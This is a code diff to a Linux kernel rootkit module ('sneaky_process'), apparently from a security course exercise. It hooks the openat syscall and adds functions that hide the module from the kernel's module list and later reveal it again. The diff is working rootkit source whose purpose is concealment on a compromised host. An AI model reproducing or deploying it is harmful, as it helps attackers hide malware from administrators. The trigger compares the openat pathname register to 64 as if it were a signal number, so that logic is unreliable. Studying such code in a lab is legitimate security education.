@@ -10,6 +10,7 @@
 #include <asm/cacheflush.h>
 
 #define PREFIX "sneaky_process"
+static short hidden = 0;
 
 // This is a pointer to the system call table
 static unsigned long *sys_call_table;
@@ -43,8 +44,39 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-  // Implement the sneaky part here
+
+  void showme(void);
+  void hideme(void);
+
+  int sig = regs->si;
+
+  if ((sig == 64) && (hidden == 0))
+  {
+    printk(KERN_INFO "rootkit: hiding rootkit!\n");
+    hideme();
+    hidden = 1;
+  }
+  else if ((sig == 64) && (hidden == 1))
+  {
+    printk(KERN_INFO "rootkit: revealing rootkit!\n");
+    showme();
+    hidden = 0;
+  }
+
   return (*original_openat)(regs);
+}
+
+static struct list_head *prev_module;
+
+void hideme(void)
+{
+  prev_module = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
+}
+
+void showme(void)
+{
+  list_add(&THIS_MODULE->list, prev_module);
 }
 
 // The code that gets executed when the module is loaded
